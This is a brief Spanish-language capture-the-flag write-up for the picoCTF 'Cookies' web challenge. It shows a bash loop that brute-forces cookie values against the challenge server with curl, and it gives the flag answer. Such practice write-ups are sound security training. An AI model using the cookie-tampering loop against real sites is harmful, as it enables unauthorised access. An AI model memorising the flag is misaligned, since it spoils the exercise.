
### Descripción 
Who doesn't love cookies? Try to figure out the best one. [http://mercury.picoctf.net:64944/](http://mercury.picoctf.net:64944/)
### Solución
Automatizamos el cambio de las cookies
	*for i in {0..20}; do curl http://mercury.picoctf.net:64944/check -H "Cookie: name=$i"; done | grep pico*
	
Solución: **picoCTF{3v3ry1_l0v3s_c00k135_cc9110ba}**
### Notas adicionales
	El reto también se puede resolver con el BurpSuite

### Referencias 
https://www.youtube.com/watch?v=LseQ-XWCXVo&list=PLDo9DMLZyP6kTZ8Td37-LdbAx4-yNfHBl&index=12
